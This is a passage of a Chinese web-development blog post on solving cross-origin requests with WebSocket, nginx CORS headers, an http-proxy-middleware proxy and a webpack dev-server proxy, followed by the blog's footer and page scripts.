+    socket.onmessage = function (e) {
+      // 打印收到的数据
+      console.log(e.data); // I love you, too
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class="lang-js">/* 服务端代码 */
+const express = require(&#39;express&#39;);
+const app = express();
+
+// 引入 webSocket
+const WebSocket = require(&#39;ws&#39;);
+// 创建连接，端口号与前端相对应
+const wss = new WebSocket.Server({ port: 3000 });
+
+// 监听连接
+wss.on(&#39;connection&#39;, function (ws) {
+  // 监听消息
+  ws.on(&#39;message&#39;, function (data) {
+    // 打印消息
+    console.log(data); // I love you
+    // 发送消息
+    ws.send(&#39;I love you, too&#39;);
+  });
+});
+</code></pre><h3 id="使用-nginx-实现跨域"><a href="#使用-nginx-实现跨域" class="headerlink" title="使用 nginx 实现跨域"></a>使用 nginx 实现跨域</h3><blockquote class="pullquote warning"><p><strong><code>nginx</code> 本身就是一个服务器，因此我们需要去 <code>nginx</code> 官网下载服务环境</strong> <a>http://nginx.org/en/download.html</a><strong>。</strong></p><ul><li><strong>下载后解压到一个文件夹中；</strong></li><li><strong>双击 <code>nginx.exe</code> 启动（此时可以通过</strong> <a href="javascript:;">http://localhost</a> <strong>访问 <code>nginx</code> 服务）；</strong></li><li><strong>在目录新建 <code>json</code> 文件夹；</strong></li><li><strong>进入 <code>json</code> 文件夹新建 <code>data.json</code> 文件并写入内容；</strong></li><li><strong>回到 <code>nginx</code> 根目录进入 <code>conf</code> 文件夹；</strong></li><li><strong>使用编辑器打开 <code>nginx.conf</code> 进行配置。</strong></li></ul></blockquote><p><strong>data.json 文件：</strong></p><pre><code class="lang-json">{
+  &quot;name&quot;: &quot;nginx&quot;
+}
+</code></pre><p><strong>nginx.conf 文件：</strong></p><pre><code class="lang-nginx"># nginx 配置
+server {
+  # ...
+  location ~.*\.json {
+    root json;
+    add_header &quot;Access-Control-Allow-Origin&quot; &quot;*&quot;;
+  }
+  # ...
+}
+</code></pre><blockquote class="pullquote danger"><p><strong>含义：</strong></p><ul><li><strong>~.*\.json：代表忽略大小写，后缀名为 json 的文件；</strong></li><li><strong>root json：代表 <code>json</code> 文件夹；</strong></li><li><strong>add_header：代表加入跨域的响应头及允许访问的域，<code>*</code> 为允许任何访问。</strong></li></ul></blockquote><p>在 <code>nginx</code> 根目录启动 <code>cmd</code> 命令行（<code>Windows</code> 系统必须使用 <code>cmd</code> 命令行）执行下面代码重启 <code>nginx</code>。</p><pre><code class="lang-bash">$ nginx -s reload
+</code></pre><p>不跨域访问：<a href="javascript:;">http://localhost/data.json</a>，跨域访问时需要创建跨域条件代码如下：</p><pre><code class="lang-js">/* 服务端代码 */
+const express = require(&#39;express&#39;);
+const app = express();
+
+app.use(express.static(__dirname));
+app.listen(3000);
+</code></pre><p>跨域访问：<a href="javascript:;">http://localhost:3000/index.html</a></p><pre><code class="lang-html">&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;nginx跨域&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    const xhr = new XMLHttpRequest();
+    xhr.open(&#39;GET&#39;, &#39;http://localhost/data.json&#39;, true);
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) {
+        if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status === 304) {
+          console.log(xhr.response);
+        }
+      }
+    }
+    xhr.send();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h3 id="使用-http-proxy-middleware-实现跨域"><a href="#使用-http-proxy-middleware-实现跨域" class="headerlink" title="使用 http-proxy-middleware 实现跨域"></a>使用 http-proxy-middleware 实现跨域</h3><p><code>Node.js</code> 中间件 <code>http-proxy-middleware</code> 实现跨域代理，原理大致与 <code>nginx</code> 相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置 <code>cookieDomainRewrite</code> 参数修改响应头中 <code>cookie</code> 中的域名，实现当前域的 <code>cookie</code> 写入，方便接口登录认证。</p><h4 id="非-vue-框架的跨域（2-次跨域）"><a href="#非-vue-框架的跨域（2-次跨域）" class="headerlink" title="非 vue 框架的跨域（2 次跨域）"></a>非 vue 框架的跨域（2 次跨域）</h4><pre><code class="lang-html">&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;proxy 跨域&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    const xhr = new XMLHttpRequest();
+
+    // 前端开关：浏览器是否读写 cookie
+    xhr.withCredentials = true;
+
+    // 访问 http-proxy-middleware 代理服务器
+    xhr.open(&#39;get&#39;, &#39;http://www.proxy1.com:3000/login?user=admin&#39;, true);
+    xhr.send();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>中间代理服务中使用了 <code>http-proxy-middleware</code> 中间件，因此需要提前下载：</p><pre><code class="lang-bash">$ npm install http-proxy-middleware --save-dev
+</code></pre><pre><code class="lang-js">/* 中间代理服务器 */
+const express = require(&#39;express&#39;);
+const proxy = require(&#39;http-proxy-middleware&#39;);
+const app = express();
+
+app.use(
+  &#39;/&#39;,
+  proxy({
+    // 代理跨域目标接口
+    target: &#39;http://www.proxy2.com:8080&#39;,
+    changeOrigin: true,
+
+    // 修改响应头信息，实现跨域并允许带 cookie
+    onProxyRes: function (proxyRes, req, res) {
+      res.header(&#39;Access-Control-Allow-Origin&#39;, &#39;http://www.proxy1.com&#39;);
+      res.header(&#39;Access-Control-Allow-Credentials&#39;, &#39;true&#39;);
+    },
+
+    // 修改响应信息中的 cookie 域名
+    cookieDomainRewrite: &#39;www.proxy1.com&#39; // 可以为 false，表示不修改
+  });
+);
+
+app.listen(3000);
+</code></pre><pre><code class="lang-js">/* 服务器 */
+const http = require(&#39;http&#39;);
+const qs = require(&#39;querystring&#39;);
+
+const server = http.createServer();
+
+server.on(&#39;request&#39;, function (req, res) {
+  let params = qs.parse(req.url.substring(2));
+
+  // 向前台写 cookie
+  res.writeHead(200, {
+    // HttpOnly：脚本无法读取
+    &#39;Set-Cookie&#39;: &#39;l=a123456;Path=/;Domain=www.proxy2.com;HttpOnly&#39;
+  });
+
+  res.write(JSON.stringify(params));
+  res.end();
+});
+
+server.listen(&#39;8080&#39;);
+</code></pre><h4 id="vue-框架的跨域（1-次跨域）"><a href="#vue-框架的跨域（1-次跨域）" class="headerlink" title="vue 框架的跨域（1 次跨域）"></a>vue 框架的跨域（1 次跨域）</h4><p>利用 <code>node + webpack + webpack-dev-server</code> 代理接口跨域。在开发环境下，由于 <code>Vue</code> 渲染服务和接口代理服务都是 <code>webpack-dev-server</code>，所以页面与代理接口之间不再跨域，无须设置 <code>Headers</code> 跨域信息了。</p><pre><code class="lang-js">/* 导出服务器配置 */
+module.exports = {
+  entry: {},
+  module: {},
+  // ...
+  devServer: {
+    historyApiFallback: true,
+    proxy: [{
+      context: &#39;/login&#39;,
+      target: &#39;http://www.proxy2.com:8080&#39;,  // 代理跨域目标接口
+      changeOrigin: true,
+      secure: false,  // 当代理某些 https 服务报错时用
+      cookieDomainRewrite: &#39;www.domain1.com&#39;  // 可以为 false，表示不修改
+    }],
+    noInfo: true
+  }
+}
+</code></pre><blockquote class="pullquote success"><p><strong>本篇文章在于帮助我们理解跨域，以及不同跨域方式的基本原理，在公司的项目比较多，多个域使用同一个服务器或者数据，以及在开发环境时，跨域的情况基本无法避免，一般会有各种各样形式的跨域解决方案，但其根本原理基本都在上面的跨域方式当中方式，我们可以根据开发场景不同，选择最合适的跨域解决方案。</strong></p></blockquote></div><div class="read-end"><span class="read-end-lg">--------------------</span> <span class="read-end-md">---------------</span> <span class="read-end-sm">----------</span> 本文结束 <i class="icon icon-paw"></i> 感谢您的阅读 <span class="read-end-sm">----------</span> <span class="read-end-md">---------------</span> <span class="read-end-lg">--------------------</span></div><blockquote class="post-copyright"><div class="content"><span class="post-time">更新时间：<time datetime="2020-08-30T19:51:52.000Z" itemprop="dateUpdated">2020-08-31 03:51:52</time></span><br><span class="permalink">本文链接：<a href="/20180611010638/" target="_blank" rel="external">https://www.overtaking.top/20180611010638/</a></span><br><span class="post-message">版权声明：本博客所有文章除特别声明外，均采用 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0 </a>许可协议，转载请注明出处！</span></div><footer><a href="https://www.overtaking.top"><img src="/img/avatar.jpeg" alt="Panda Shen"> Panda Shen</a></footer></blockquote><div class="page-reward"><a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a></div><div class="post-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JSONP/" rel="tag">JSONP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B7%A8%E5%9F%9F/" rel="tag">跨域</a></li></ul><div class="page-share-wrap"><div class="page-share" id="pageShare"><ul class="reset share-icons"><li><a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.overtaking.top/20180611010638/&title=《九种 “姿势” 让你彻底解决跨域问题》 — Shen's Blog&pic=https://www.overtaking.top/img/avatar.jpeg" data-title="微博"><i class="icon icon-weibo"></i></a></li><li><a class="weixin share-sns wxFab" href="javascript:;" data-title="微信"><i class="icon icon-weixin"></i></a></li><li><a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.overtaking.top/20180611010638/&title=《九种 “姿势” 让你彻底解决跨域问题》 — Shen's Blog&source=同源策略同源策略 SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的..." data-title=" QQ"><i class="icon icon-qq"></i></a></li><li><a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.overtaking.top/20180611010638/" data-title=" Facebook"><i class="icon icon-facebook"></i></a></li><li><a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《九种 “姿势” 让你彻底解决跨域问题》 — Shen's Blog&url=https://www.overtaking.top/20180611010638/&via=https://www.overtaking.top" data-title=" Twitter"><i class="icon icon-twitter"></i></a></li><li><a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.overtaking.top/20180611010638/" data-title=" Google+"><i class="icon icon-google-plus"></i></a></li></ul></div><a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle"><i class="icon icon-share-alt icon-lg"></i></a></div></div></div><nav class="post-nav flex-row flex-justify-between"><div class="waves-block waves-effect prev"><a href="/20180612045005/" id="post-prev" class="post-nav-link"><div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> 上一篇</div><h4 class="title">异步发展流程 —— Promise 的基本使用</h4></a></div><div class="waves-block waves-effect next"><a href="/20180328140039/" id="post-next" class="post-nav-link"><div class="tips">下一篇 <i class="icon icon-angle-right icon-lg icon-pl"></i></div><h4 class="title">模拟 Vue 手写一个 MVVM</h4></a></div></nav><div class="comments vcomment" id="comments"></div></article><div id="reward" class="page-modal reward-lay"><a class="close" href="javascript:;"><i class="icon icon-close"></i></a><h3 class="reward-title"><i class="icon icon-quote-left"></i> 大爷，赏口饭吃吧~ <i class="icon icon-quote-right"></i></h3><div class="reward-content"><div class="reward-code"><img id="rewardCode" src="/img/wechatpay.jpg" alt="打赏二维码"></div><label class="reward-toggle"><input id="rewardToggle" type="checkbox" class="reward-toggle-check" data-wechat="/img/wechatpay.jpg" data-alipay="/img/alipay.jpg"><div class="reward-toggle-ctrol"><span class="reward-toggle-item wechat">微信</span> <span class="reward-toggle-item switch">切换</span> <span class="reward-toggle-item alipay">支付宝</span></div></label></div></div></div><footer class="footer"><div class="top"><p><span id="busuanzi_container_site_uv" style="display:none">站点总访客数：<span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" style="display:none">站点总访问量：<span id="busuanzi_value_site_pv"></span></span></p><p><span><a href="/rss2.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span> <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span></p></div><div class="bottom"><p><span>Panda Shen &copy; 2017 - 2022</span> <span>Hosted by <a href="https://dev.tencent.com/production" target="_blank">Github Pages</a></span></p></div></footer></main><div class="mask" id="mask"></div><a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a> <a href="javascript:;" id="gobottom" class="waves-effect waves-circle waves-light"><span class="icon icon-lg"></span></a><div class="global-share" id="globalShare"><ul class="reset share-icons"><li><a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.overtaking.top/20180611010638/&title=《九种 “姿势” 让你彻底解决跨域问题》 — Shen's Blog&pic=https://www.overtaking.top/img/avatar.jpeg" data-title="微博"><i class="icon icon-weibo"></i></a></li><li><a class="weixin share-sns wxFab" href="javascript:;" data-title="微信"><i class="icon icon-weixin"></i></a></li><li><a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.overtaking.top/20180611010638/&title=《九种 “姿势” 让你彻底解决跨域问题》 — Shen's Blog&source=同源策略同源策略 SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的..." data-title=" QQ"><i class="icon icon-qq"></i></a></li><li><a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.overtaking.top/20180611010638/" data-title=" Facebook"><i class="icon icon-facebook"></i></a></li><li><a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《九种 “姿势” 让你彻底解决跨域问题》 — Shen's Blog&url=https://www.overtaking.top/20180611010638/&via=https://www.overtaking.top" data-title=" Twitter"><i class="icon icon-twitter"></i></a></li><li><a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.overtaking.top/20180611010638/" data-title=" Google+"><i class="icon icon-google-plus"></i></a></li></ul></div><div class="page-modal wx-share" id="wxShare"><a class="close" href="javascript:;"><i class="icon icon-close"></i></a><p>扫一扫，分享到微信</p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABw0lEQVR42u3aQW7DMAwEwPz/0+m1FztLMlRdYHQqEFee5ECQK71e8Xr/WvfPJM8nu40WLi7umPu+XfcvSP7raoerT692w8XFPc9NCtPV1lf7JOUsN+Di4j6f23tx/lVxcXH/Izdvie7bI1xc3Cdze2PMZEBan9VwcXEH3Dyl3Pt7Jd/FxcVtcd/F9a2Ytfl2XFzcI9y8oIyCjOIR7IfIFRcX9wi3+ui8hFU7mdENEVxc3CI3iT8mZSgvheWODBcXd42bXJvIQ8xqDJofruDi4v4VdzKcTIafPHzBxcU9w82PSPOCNb9+ETU3uLi4B7nVMDQfaaqfRoUMFxd3gZvElL0RJd+heWyDi4u7xs1ji3xAqh6dlusuLi7uMnfSxIxeE0ctH3bAxcVd41ZLUvUopRemFPJdXFzcNW5+MSs5js0PWatRCy4u7knuRiCSF8HCM7i4uMvcd3ElBa63TzQm4eLiHuFWo4pCvlIsapM2CxcXd4ObF5355Yy8tWo2Ori4uF/l5oUmjz8WZzVcXNyHce+/QG/lXwYXF/eZ3O3W58MOuLi4B7m9K5vVMGX+o+Di4p7hVktJszUpjkBfyHdxcXE73B9ujFLBbgMN4wAAAABJRU5ErkJggg==" alt="微信分享二维码"></div><script>window.addEventListener("DOMContentLoaded",function(o){var t=window.location.pathname,e=document.querySelector("#gobottom"),n=document.querySelector("#gobottom span");/^\/(\d+?)\//.test(t)||-1!==["/about/"].indexOf(t)?n.classList.add("icon-comments"):n.classList.add("icon-chevron-down"),e.classList.add("waves-toggle")})</script><script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script><script>var BLOG={ROOT:"/",SHARE:!0,REWARD:!0}</script><script src="/js/main.min.js?v=1.7.2"></script><div class="search-panel" id="search-panel"><ul class="search-result" id="search-result"></ul></div><template id="search-tpl"><li class="item"><a href="{path}" class="waves-block waves-effect"><div class="title ellipsis" title="{tip}">{title}</div><div class="flex-row flex-middle"><div class="tags ellipsis">{tags}</div><time class="flex-col time">{date}</time></div></a></li></template><script src="/js/search.min.js?v=1.7.2" async></script><script src="/js/cursor.min.js?v=1.7.2" async></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});</script><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" async></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var META=["nick","mail","link"],meta="nick,mail".split(",").filter(function(e){return-1<META.indexOf(e)});new Valine({el:"#comments",appId:"RqIV72rdY61eUlDassFQDxPG-gzGzoHsz",appKey:"Mvo4cTDcS9hw0l03mINzvdNk",placeholder:"欢迎交流、指正！",avatar:"mm",meta:0===meta.length?META:meta,pageSize:"10",visitor:!0,highlight:!0,recordIP:!1,enableQQ:!0,requiredFields:0===meta.length?META:meta})</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>!function(){var t,e=document.title;document.addEventListener("visibilitychange",function(){document.hidden?(document.title="愿风指引你前进的道路！",clearTimeout(t)):(document.title="真正重要的，只是当下！",t=setTimeout(function(){document.title=e},2e3))})}()</script><script>window.addEventListener('DOMContentLoaded', function (event) {
+        document.querySelectorAll('pre[class*=language-]').forEach(function(node) {
+            var classList = Array.prototype.slice.call(node.classList);
+            var ingnoreClassList = ['language-treeview', 'language-bash', 'language-git'];
+
+            if (ingnoreClassList.every(name => classList.indexOf(name) === -1)) {
+                node.classList.add('line-numbers');
+                node.classList.add('match-braces');
+                node.classList.add('rainbow-braces');
+                node.classList.add('diff-highlight');
+            }
+        });
+
+        Prism.highlightAll();
+    });</script><script src="/js/prism.min.js?v=1.7.2"></script><script src="/js/prism-vim.min.js?v=1.7.2"></script><script>
+    if(!('loading' in HTMLImageElement.prototype)) {
+        const srp = document.createElement('script');
+        srp.src = 'https://cdn.jsdelivr.net/npm/lazysizes@5.1.1/lazysizes.min.js';
+        document.body.append(srp);
+        const imgs = document.querySelectorAll('img');
+        imgs.forEach(el => {
+            el.setAttribute('data-src', el.getAttribute('src'));
+            el.removeAttribute('src');
+            el.classList.add('lazyload');
+    })
+}
+</script></body></html>
